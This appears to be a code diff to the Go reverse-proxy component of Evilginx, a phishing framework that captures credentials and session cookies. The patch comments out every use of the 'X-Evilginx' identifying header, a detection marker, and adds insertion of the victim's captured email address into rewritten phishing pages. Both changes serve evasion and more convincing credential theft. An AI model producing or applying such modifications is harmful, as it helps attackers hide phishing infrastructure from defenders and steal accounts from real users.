@@ -177,7 +177,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			o_host := req.Host
+			//o_host := req.Host  // Removing X-Evilginx header reporting
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -409,7 +409,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				//req.Header.Set(p.getHomeDir(), o_host) // Removing X-Evilginx header reporting
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -606,7 +606,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					//req.Header.Set(p.getHomeDir(), o_host) // Removing X-Evilginx header reporting
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1009,6 +1009,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
 									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
 									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+									if email, ok := p.sessions[ps.SessionId].Params["email"]; ok {
+										replace_s = strings.Replace(replace_s, "{email}", email, -1)
+									}
 									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
 									if ok {
 										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
@@ -1654,9 +1657,10 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+// X-Evilginx header reporting string
+// func (p *HttpProxy) getHomeDir() string {
+// 	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+// }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
